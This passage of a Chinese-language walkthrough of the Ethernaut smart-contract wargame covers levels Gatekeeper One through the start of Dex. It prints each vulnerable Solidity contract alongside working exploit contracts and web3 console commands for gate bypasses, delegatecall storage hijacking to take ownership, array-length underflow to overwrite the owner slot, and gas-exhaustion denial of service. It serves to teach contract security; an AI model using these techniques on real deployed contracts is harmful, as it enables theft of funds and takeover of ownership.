\u6d4b\u8bd5\u7f51\u7edc\u4e2d\u8fd0\u884c\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u518d\u6b21\u8c03\u8bd5\uff0c\u89c2\u5bdf\u6808\u4e2d\u51fa\u73b0 0x1fff(8191) \u7684\u4e0b\u4e00\u4e2a\u6570\u5b57\uff0c\u4e3a 0x60a4(24740) \uff0c\u5f97\u51fa\u6700\u7ec8\u9700\u8981\u7684\u6c7d\u6cb9\u91cf\u4e3a\uff1a \\(24996-24740+8191\\times 3=24829\\) \u5bf9\u4e8e gateThree \uff0c\u7528 \\(A_0A_1...A_7\\) \u6765\u8868\u793a _gateKey \u7684\u5404\u4e2a\u5b57\u8282 part one \u9700\u6ee1\u8db3 \\(A_4A_5A_6A_7 = A_6A_7\\) part two \u9700\u6ee1\u8db3 \\(A_4A_5A_6A_7 \\neq A_0A_1...A_7\\) part three \u9700\u6ee1\u8db3 \\(A_4A_5A_6A_7 = B_6B_7\\) \uff08\u89c6\u4f5c tx.origin \u540e\u4e24\u4e2a\u5b57\u8282\uff09 \u4e5f\u5c31\u662f\u8bf4\uff0c _gateKey \u53ea\u9700\u8981\u540e\u4e24\u4e2a\u5b57\u8282\u4e0e tx.origin \u4e00\u81f4\uff0c\u5012\u6570\u4e09\u56db\u5b57\u8282\u4e3a \\(0\\) \uff0c\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u4e0d\u4e3a \\(0\\) \u5c31\u53ef\u4ee5\u4e86 >v< 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperOne { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { require ( gasleft () % 8191 == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint160 ( tx . origin )), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } contract Hack { function exploit ( address instance ) public { GatekeeperOne gk = GatekeeperOne ( instance ); bytes8 _gateKey = bytes8 ( uint64 ( uint160 ( tx . origin )) & 0xff0000ffff ); gk . enter { gas : 24829 }( _gateKey ); } } \u53c2\u8003\u8d44\u6599 \u00b6 Solidity variables \u2014 storage, type conversions and accessing private variables solidity - Why does Remix's jsVM show incorrect gas? - Ethereum Stack Exchange Opcodes for the EVM | ethereum.org 14. Gatekeeper Two \u00b6 \u901a\u8fc7\u65b0\u7684\u6311\u6218\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { uint x ; assembly { x := extcodesize ( caller ()) } // \u5185\u8054\u6c47\u7f16 // caller() - call sender (excluding delegatecall) // extcodesize(a) - size of the code at address a require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( msg . sender )))) ^ uint64 ( _gateKey ) == type ( uint64 ). max ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } gateTwo \u9700\u8981\u8c03\u7528\u5408\u7ea6\u7684\u4ee3\u7801\u957f\u5ea6\u4e3a 0\uff0c\u4e0e\u89e3\u9898\u77db\u76fe\u3002 ETHEREUM: A SECURE DECENTRALISED GENERALISED TRANSACTION LEDGER \u4e2d\u63d0\u5230\uff0c\u5728\u4ee3\u7801\u521d\u59cb\u5316\u65f6\uff0c\u5bf9\u5e94\u5730\u5740\u7684 EXTCODESIZE \u5e94\u8fd4\u56de 0\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u5728\u6784\u9020\u51fd\u6570\u91cc\u8c03\u7528 enter \u5c31\u53ef\u4ee5\u4e86 \u81f3\u4e8e gateThree \uff0c\u4f7f\u7528\u5f02\u6216\u9006\u8fd0\u7b97\u6c42\u89e3\u5c31\u597d\u5566 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { uint x ; assembly { x := extcodesize ( caller ()) } require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( msg . sender )))) ^ uint64 ( _gateKey ) == type ( uint64 ). max ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } contract Hack { constructor ( address instance ) { GatekeeperTwo gk = GatekeeperTwo ( instance ); gk . enter ( bytes8 ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( address ( this ))))) ^ ( type ( uint64 ). max ))); } } \u53c2\u8003\u8d44\u6599 \u00b6 Inline Assembly 15. Naught Coin \u00b6 \u53d6\u51fa\u88ab\u9501\u4f4f\u7684\u786c\u5e01\uff0c\u6e05\u7a7a\u81ea\u5df1\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import '@openzeppelin/contracts/token/ERC20/ERC20.sol' ; contract NaughtCoin is ERC20 { // \u57fa\u4e8e ERC20 // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = block . timestamp + 10 * 365 days ; uint256 public INITIAL_SUPPLY ; address public player ; constructor ( address _player ) ERC20 ( 'NaughtCoin' , '0x0' ) { player = _player ; INITIAL_SUPPLY = 1000000 * ( 10 ** uint256 ( decimals ())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint ( player , INITIAL_SUPPLY ); // Creates INITIAL_SUPPLY tokens and assigns them to player emit Transfer ( address ( 0 ), player , INITIAL_SUPPLY ); } function transfer ( address _to , uint256 _value ) override public lockTokens returns ( bool ) { // super \u7ee7\u627f\u76f4\u63a5\u7236\u5408\u7ea6\u7684 transfer \u51fd\u6570 super . transfer ( _to , _value ); // \u5c06\u8c03\u7528\u8005 _value \u6570\u91cf\u7684\u91d1\u989d\u8f6c\u79fb\u7ed9 _to } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens () { if ( msg . sender == player ) { require ( block . timestamp > timeLock ); _ ; } else { _ ; } } } lockTokens \u9650\u5236\u4e86 player \uff0c\u800c\u88ab\u8986\u5199\u7684 transfer \u53ea\u80fd\u7531\u6301\u6709\u8d27\u5e01\u7684\u8d26\u6237\u53d1\u8d77\u8f6c\u8d26 NaughtCoin \u5408\u7ea6\u662f ERC20 \u7684\u5b50\u5408\u7ea6\uff0c\u5728\u5408\u7ea6 ERC20 \u4e2d\u9664\u4e86\u5b9a\u4e49 transfer \u8fd8\u6709 transferFrom \u51fd\u6570\uff0c\u7531\u6b64\u53ef\u4ee5\u7ed5\u8fc7 lockTokens \u7684\u9650\u5236 1 transferFrom(address sender, address recipient, uint256 amount) \u2192 bool \u5728\u8c03\u7528 transferFrom \u4e4b\u524d\u9700\u8981\u53d6\u5f97 msg.sender \u7684\u6388\u6743 1 >> await contract . approve ( player , await contract . INITIAL_SUPPLY ()) \u53d1\u8d77\u8f6c\u8d26 1 >> await contract . transferFrom ( player , instance , await contract . INITIAL_SUPPLY ()) \u53c2\u8003\u8d44\u6599 \u00b6 ERC 20 - OpenZeppelin Docs 16. Preservation \u00b6 \u58f0\u660e\u5bf9\u5b9e\u4f8b\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg . sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; // \u4fee\u6539\u4e86\u7b2c\u4e00\u4e2a\u72b6\u6001\u53d8\u91cf } } delegatecall \u53ea\u4f7f\u7528\u7ed9\u5b9a\u5730\u5740\u7684\u4ee3\u7801\uff0c\u5176\u4ed6\u5c5e\u6027\uff08\u5b58\u50a8\u3001\u4f59\u989d\u7b49\uff09\u90fd\u53d6\u81ea\u5f53\u524d\u5408\u7ea6\uff0c\u56e0\u6b64\uff0c\u8c03\u7528 delegatecall \u5408\u7ea6\u7684\u5b58\u50a8\u5e03\u5c40\u5fc5\u987b\u548c\u88ab\u8c03\u7528\u5408\u7ea6\u4fdd\u6301\u4e00\u81f4 \u5148\u5229\u7528 setFirstTime \u4fee\u6539\u5408\u7ea6 Preservation \u7684\u7b2c\u4e00\u4e2a\u72b6\u6001\u53d8\u91cf\uff0c\u5373 timeZone1Library \u7684\u503c\u4e3a\u5408\u7ea6 Hack \u7684\u5730\u5740\uff0c\u518d\u8c03\u7528 setFirstTime \u51fd\u6570\uff0c\u6b64\u65f6\u5c06\u6267\u884c\u5408\u7ea6 Hack \u4e2d\u7684\u4ee3\u7801 timeZone1Library \u5982\u679c\u4fee\u6539\u9519\u8bef\u5219\u65e0\u6cd5\u8fdb\u884c\u540e\u7eed\u6b65\u9aa4\uff0c\u6b64\u65f6\u518d\u91cd\u65b0\u7533\u8bf7\u4e00\u4e2a\u5b9e\u4f8b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Preservation { address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg . sender ; } function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } contract LibraryContract { uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } contract Hack { // Make sure the storage layout is the same as Preservation // This will allow us to correctly update the state variables address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; Preservation preservation ; constructor ( address instance ) { preservation = Preservation ( instance ); } function attack () public { // override address of timeZone1Library preservation . setFirstTime ( uint ( uint160 ( address ( this )))); // change the owner preservation . setFirstTime ( 1 ); } // function signature must match LibraryContract.setTimeSignature function setTime ( uint _time ) public { owner = tx . origin ; _time ; } } \u5e93\u5e94\u4f7f\u7528 library \u6765\u58f0\u660e library \u4e0e contract \u7c7b\u4f3c\uff0c\u4f46\u4e0d\u80fd\u58f0\u660e\u4efb\u4f55\u72b6\u6001\u53d8\u91cf\u6216\u5411\u5176\u53d1\u9001\u4ee5\u592a \u53c2\u8003\u8d44\u6599 \u00b6 Delegatecall | Solidity by Example Library | Solidity by Example 17. Recovery \u00b6 \u4ece\u9057\u5931\u7684\u5408\u7ea6\u5730\u5740\u4e2d\u627e\u56de 0.5 \u4ee5\u592a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Recovery { //generate tokens function generateToken ( string memory _name , uint256 _initialSupply ) public { new SimpleToken ( _name , msg . sender , _initialSupply ); } } contract SimpleToken { string public name ; mapping ( address => uint ) public balances ; // constructor constructor ( string memory _name , address _creator , uint256 _initialSupply ) { name = _name ; balances [ _creator ] = _initialSupply ; } // collect ether in return for tokens receive () external payable { balances [ msg . sender ] = msg . value * 10 ; } // allow transfers of tokens function transfer ( address _to , uint _amount ) public { require ( balances [ msg . sender ] >= _amount ); balances [ msg . sender ] = balances [ msg . sender ] - _amount ; balances [ _to ] = _amount ; } // clean up after ourselves function destroy ( address payable _to ) public { selfdestruct ( _to ); } } \u5df2\u77e5\u5408\u7ea6 Recovery \u7684\u5730\u5740\uff0c\u9700\u8981\u6062\u590d\u5176\u4e2d\u521b\u5efa\u7684\u5408\u7ea6 SimpleToken \u91cc\u7684\u4ee5\u592a\uff0c\u4f46\u5408\u7ea6 SimpleToken \u521b\u5efa\u540e\u6ca1\u6709\u8d4b\u503c\u7ed9\u53d8\u91cf \u4e0d\u8fc7\u4fe1\u606f\u90fd\u662f\u516c\u5f00\u7684\u561b\uff01\u4f7f\u7528\u5408\u7ea6 Recovery \u7684\u5730\u5740\u5728 Etherscan \u627e\u5230\u4ea4\u6613\u4fe1\u606f\uff0c\u5176\u4e2d\u5c31\u5305\u62ec\u5408\u7ea6\u521b\u5efa \u03a6\u03c9\u03a6 \u5408\u7ea6 SimpleToken \u5b9e\u4f8b\u7684\u5730\u5740 GET \u2714\ufe0f \u5728 Remix \u6dfb\u52a0\u5408\u7ea6 SimpleToken \u7684\u6e90\u7801\uff0c\u901a\u8fc7 At Address \u5f15\u7528\u5408\u7ea6 \u63a5\u4e0b\u6765\u8c03\u7528 destroy \u51fd\u6570\u5c31\u53ef\u4ee5\u53d6\u56de\u4ee5\u592a\u5566 XD \u5b9e\u9645\u4e0a\uff0c\u5408\u7ea6\u5730\u5740\u90fd\u662f\u786e\u5b9a\u6027\u7684\uff0c\u901a\u8fc7\u5408\u7ea6\u521b\u5efa\u8005\uff08 sender \uff09\u7684\u5730\u5740 address \u4ee5\u53ca\u7531\u521b\u5efa\u8005\u53d1\u8d77\u7684\u4ea4\u6613\u7684\u6570\u91cf nonce \u8ba1\u7b97\u83b7\u5f97 \u6839\u636e EIP 161 \uff0c\u521d\u59cb nonce \u4e3a \\(1\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 import rlp from eth_utils import keccak , to_checksum_address , to_bytes def mk_contract_address ( sender : str , nonce : int ) -> str : \"\"\" Create a contract address using eth-utils. \"\"\" sender_bytes = to_bytes ( hexstr = sender ) address_bytes = keccak ( rlp . encode ([ sender_bytes , nonce ]))[ 12 :] return to_checksum_address ( address_bytes ) mk_contract_address ( to_checksum_address ( \"0x518C2143bDd79d3bc060BC4883d92D545D3E3bb0\" ), 1 ) # 0x53D144BcF44de3DeE630b1CFEabD91AC3d3caF5a \u56e0\u6b64\uff0c\u53ef\u4ee5\u5c06\u4ee5\u592a\u5e01\u53d1\u9001\u5230\u9884\u786e\u5b9a\u7684\u5730\u5740\uff0c\u968f\u540e\u5728\u6307\u5b9a\u5730\u5740\u521b\u5efa\u5408\u7ea6\u6765\u6062\u590d\u4ee5\u592a\u5e01\uff0c\u5b9e\u73b0\u65e0\u79c1\u94a5\u4fdd\u5b58\u4ee5\u592a\u5e01 \u53c2\u8003\u8d44\u6599 \u00b6 How is the address of an Ethereum contract computed? Normal transactions VS. Internal transactions in etherscan - Ethereum Stack Exchange 18. MagicNumber \u00b6 \u90e8\u7f72\u5408\u7ea6 Solver \uff0c\u5305\u542b\u51fd\u6570 whatIsTheMeaningOfLife() \uff0c\u9700\u8981\u8fd4\u56de\u6b63\u786e\u7684\u6570\uff0c\u5373 42 \u4ee3\u7801\u6700\u591a\u53ea\u80fd\u5305\u542b 10 \u4e2a\u64cd\u4f5c\u7801\uff0c\u53ef\u80fd\u9700\u8981\u4eba\u5de5\u7f16\u5199 EVM \u5b57\u8282\u7801 \ud83d\ude31 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract MagicNum { address public solver ; constructor () {} function setSolver ( address _solver ) public { solver = _solver ; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } EVM \u6267\u884c\u5b57\u8282\u7801\uff0c\u5e76\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u3001\u53c2\u6570\u540d\u7b49\u4fe1\u606f \u901a\u8fc7 ABI\uff0c\u5176\u5b83\u5408\u7ea6\u80fd\u591f\u8c03\u7528\u6307\u5b9a\u5408\u7ea6\u7684\u51fd\u6570 \u65e0\u8bba\u88ab\u8c03\u7528\u7684\u51fd\u6570\u540d\u662f\u4ec0\u4e48\u90fd\u5c06\u8fd4\u56de \\(42\\) \u7684\u5408\u7ea6 \ud83d\udc47\ud83c\udffb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 60 0a 60 0c 60 00 39 // copy code into memory 60 0a 60 00 f3 // return code 60 2a 60 00 52 // push 42 into memory 60 20 60 00 f3 // return \u7531\u5916\u90e8\u8d26\u6237\u53d1\u8d77\u6ca1\u6709 to \u5730\u5740\u7684\u8f6c\u8d26\u4ea4\u6613\uff0c\u5e76\u5c06\u5408\u7ea6\u7684 bytecode \u653e\u5728 data \u57df\u5373\u53ef\u521b\u5efa\u5408\u7ea6 1 2 3 >> let bytecode = \"600a600c600039600a6000f3602a60005260206000f3\" ; >> await web3 . eth . sendTransaction ({ \"data\" : bytecode , \"from\" : player }) Object { blockHash : \"0x91be4e10a259695dc64e5feea7b875135dfc3f96f1b649554761514f4282c815\" , blockNumber : 8034615 , contractAddress : \"0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736\" , ... } \u63a5\u4e0b\u6765\u8c03\u7528\u5b9e\u4f8b\u7684 setSolver \u5c31\u597d\u5566 =v= 1 2 3 >> await contract . setSolver ( \"0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736\" ); >> await contract . solver (); \"0x59B38CC5e23Ac1aE9c93A4c73CA1fA9c1A149736\" \u53c2\u8003\u8d44\u6599 \u00b6 Ethereum Virtual Machine Opcodes EVM bytecode programming - HackMD evm - What is an ABI and why is it needed to interact with contracts? - Ethereum Stack Exchange 19. Alien Codex \u00b6 \u58f0\u660e\u5bf9\u5408\u7ea6\u5b9e\u4f8b\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: MIT pragma solidity ^ 0.5.0 ; import '../helpers/Ownable-05.sol' ; contract AlienCodex is Ownable { bool public contact ; bytes32 [] public codex ; modifier contacted () { assert ( contact ); _ ; } function make_contact () public { contact = true ; } function record ( bytes32 _content ) contacted public { codex . push ( _content ); } function retract () contacted public { codex . length -- ; } function revise ( uint i , bytes32 _content ) contacted public { codex [ i ] = _content ; } } \u5408\u7ea6\u7ee7\u627f\u4e2d\uff0c\u7236\u5408\u7ea6 Ownable \u7684\u4ee3\u7801\u5c06\u5168\u90e8\u62f7\u8d1d\u81f3\u5b50\u5408\u7ea6 AlienCodex \uff0c\u5305\u62ec\u53d8\u91cf owner \u6839\u636e\u63d0\u793a Understanding how array storage works \uff0c\u663e\u7136\u91cd\u70b9\u5728\u6570\u7ec4 codex \u4e0a \u52a8\u6001\u6570\u7ec4\u4e0e\u9759\u6001\u53d8\u91cf\u7684\u5b58\u50a8\u65b9\u5f0f\uff08\u53ef\u53c2\u8003 Privacy \uff09\u4e0d\u540c\uff0c\u4f46\u4ecd\u6839\u636e\u9759\u6001\u53d8\u91cf\u7684\u5b58\u50a8\u89c4\u5219\u5360\u7528\u4e00\u4e2a slot p \uff0c\u7528\u4e8e\u5b58\u50a8\u6570\u7ec4\u957f\u5ea6\uff0c\u6570\u7ec4\u504f\u79fb\u91cf\u4e3a keccak(p) \uff0c\u6570\u7ec4\u5143\u7d20\u7684\u5b58\u50a8\u65b9\u5f0f\u4e0e\u9759\u6001\u6570\u7ec4\u76f8\u540c \u6570\u7ec4\u5143\u7d20\u504f\u79fb\u91cf\u4e3a keccak(p) + (index * elementSize) codex \u5360\u7528 slot 1 \uff0c\u8ba1\u7b97\u6570\u7ec4\u504f\u79fb\u91cf 1 2 >> web3 . utils . soliditySha3 ({ type : \"uint\" , value : 1 }) \"0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\" \u5730\u5740\u957f\u5ea6\u4e3a 32 \u5b57\u8282\uff0c\u6240\u4ee5\u603b\u5171\u6709 \\(2^{256}\\) \u4e2a slot\uff0c\u90a3\u4e48\uff0c\u60f3\u8981\u4fee\u6539 slot 0 \u7684 owner \uff0c\u9700\u8981\u4fee\u6539\u4e0b\u6807\u4e3a 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a \u7684\u6570\u7ec4\u5143\u7d20 \u64cd\u4f5c\u6570\u7ec4 codex \u9700\u8981 contact \u4e3a true 1 2 3 4 5 6 7 8 >> await web3 . eth . getStorageAt ( instance , 0 ) \"0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272\" >> await contract . make_contact () >> await contract . contact () true >> await web3 . eth . getStorageAt ( instance , 0 ) \"0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272\" // slot 0 \u5b58\u50a8\u4e86\u53d8\u91cf owner \u548c contact \u7684\u503c \u4f7f\u7528 retract \u4f7f\u6570\u7ec4\u957f\u5ea6\u4e0b\u6ea2\u51fa\uff0c\u4ece\u800c\u80fd\u4fee\u6539\u76ee\u6807\u4e0b\u6807\u7684\u5143\u7d20 1 2 3 >> await contract . retract (); >> await web3 . eth . getStorageAt ( instance , 1 ); \"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\" \u4fee\u6539 owner 1 2 3 4 5 >> await contract . revise ( \"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\" , \"0x0000000000000000000000017Fb8134848aDe56fF213eC49edBbB1D830853289\" ); >> await web3 . eth . getStorageAt ( instance , 0 ); \"0x0000000000000000000000017fb8134848ade56ff213ec49edbbb1d830853289\" >> await contract . owner (); \"0x7Fb8134848aDe56fF213eC49edBbB1D830853289\" \u53c2\u8003\u8d44\u6599 \u00b6 Inheritance Layout of State Variables in Storage Accessing Private Data | Solidity by Example 20. Denial \u00b6 \u963b\u6b62 owner \u5728\u6295\u8d44\u4eba\u8c03\u7528 withdraw() \u65f6\u83b7\u5229 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Denial { address public partner ; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address ( 0xA9E ); uint timeLastWithdrawn ; mapping ( address => uint ) withdrawPartnerBalances ; // keep track of partners balances function setWithdrawPartner ( address _partner ) public { partner = _partner ; } // withdraw 1% to recipient and 1% to owner function withdraw () public { uint amountToSend = address ( this ). balance / 100 ; // perform a call without checking return // The recipient can revert, the owner will still get their share partner . call { value : amountToSend }( \"\" ); payable ( owner ). transfer ( amountToSend ); // keep track of last withdrawal time timeLastWithdrawn = block . timestamp ; withdrawPartnerBalances [ partner ] += amountToSend ; } // allow deposit of funds receive () external payable {} // convenience function function contractBalance () public view returns ( uint ) { return address ( this ). balance ; } } withdraw() \u5e76\u6ca1\u6709\u68c0\u67e5 partner.call{value:amountToSend}(\"\"); \u7684\u8fd4\u56de\u503c\uff0c\u56e0\u6b64\u88ab\u8c03\u7528\u51fd\u6570 revert \u5e76\u4e0d\u4f1a\u5f71\u54cd\u540e\u7eed\u8bed\u53e5\u7684\u6267\u884c\uff0c\u4f46\u53ef\u4ee5\u8017\u5c3d\u6c7d\u6cb9\u4f7f\u6574\u4e2a\u4ea4\u6613\u5931\u8d25 1 2 3 4 5 6 // \u5148\u4f7f\u7528 setWithdrawPartner \u8bbe\u7f6e partner \u4e3a\u5408\u7ea6 Hack \u7684\u5730\u5740 contract Hack { receive () external payable { while ( true ) {} } } \u5f53\u4f7f\u7528 call \u53d1\u8d77\u5916\u90e8\u8c03\u7528\u65f6\uff0c\u6700\u597d\u6307\u5b9a\u6c7d\u6cb9\u91cf\uff0c\u5982 call.gas(100000).value() \u5916\u90e8 CALL \u6700\u591a\u53ef\u4ee5\u4f7f\u7528 CALL \u65f6 63/64 \u7684\u6c7d\u6cb9\uff0c\u56e0\u6b64\uff0c\u8db3\u591f\u9ad8\u7684\u6c7d\u6cb9\u91cf\u4e5f\u53ef\u4ee5\u7f13\u89e3\u8fd9\u79cd\u653b\u51fb 21. Shop \u00b6 \u4ee5\u4f4e\u4e8e\u5b9a\u4ef7\u7684\u4ef7\u683c\u4ece\u5546\u5e97\u8d2d\u4e70\u5546\u54c1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Buyer { function price () external view returns ( uint ); } contract Shop { uint public price = 100 ; bool public isSold ; function buy () public { Buyer _buyer = Buyer ( msg . sender ); if ( _buyer . price () >= price && ! isSold ) { isSold = true ; price = _buyer . price (); } } } \u9700\u8981\u5b9e\u73b0 price() \u51fd\u6570\uff0c\u4f7f\u5f97\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\u8fd4\u56de\u7684\u4ef7\u683c\u4e0d\u5c0f\u4e8e\u5b9a\u4ef7\uff0c\u7b2c\u4e8c\u6b21\u8c03\u7528\u65f6\u8fd4\u56de\u7684\u4ef7\u683c\u5c0f\u4e8e\u5b9a\u4ef7 \u58f0\u660e\u4e86 view \u7684\u51fd\u6570\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\uff0c\u7b2c\u4e00\u53cd\u5e94\u662f\u5229\u7528 gasleft() \u6765\u83b7\u5f97\u53d8\u5316\u7684\u503c 1 2 3 4 5 6 7 8 contract Hack { function buy ( address instance ) public { Shop ( instance ). buy (); } function price () external view returns ( uint ) { return gasleft () / 10 - 300 ; // \u5728 Goerli \u6d4b\u8bd5\u7f51\u7edc\u4e0a\u8c03\u8bd5\u901a\u8fc7 } } \u58f0\u660e\u4e86 view \u7684\u51fd\u6570\u53ef\u4ee5\u8bfb\u53d6\u72b6\u6001\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5229\u7528\u72b6\u6001\u53d8\u91cf isSold 1 2 3 4 5 6 7 8 contract Hack { function buy ( address instance ) public { Shop ( instance ). buy (); } function price () external view returns ( uint ) { return Shop ( msg . sender ). isSold () ? 0 : 100 ; } } 22. Dex \u00b6 \u81f3\u5c11\u6e05\u7a7a DEX \u5408\u7ea6\u4e2d\u7684\u4e00\u79cd\u4ee3\u5e01 \u5408\u7ea6 Dex \u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 100 \u679a\uff0c\u73a9\u5bb6\u6bcf\u79cd\u4ee3\u5e01\u521d\u59cb\u5404 10 \u679a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\" ; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\" ; import 'openzeppelin-contracts-08/access/Ownable.sol' ; contract Dex is Ownable { address public token1 ; address public token2 ; constructor () {} function setTokens ( address _token1 , address _token2 ) public onlyOwner { token1 = _token1 ; token2 = _token2 ; } function addLiquidity ( address token_address , uint amount ) public onlyOwner { IERC20 ( token_address ). transferFrom ( msg . sender , address ( this ), amount ); } function swap ( address from , address to , uint amount ) public { require (( from == token1 && to == token2 ) || ( from == token2 && to == token1 ), \"Invalid tokens\" ); require ( IERC20 ( from ). balanceOf ( msg . sender ) >= amount 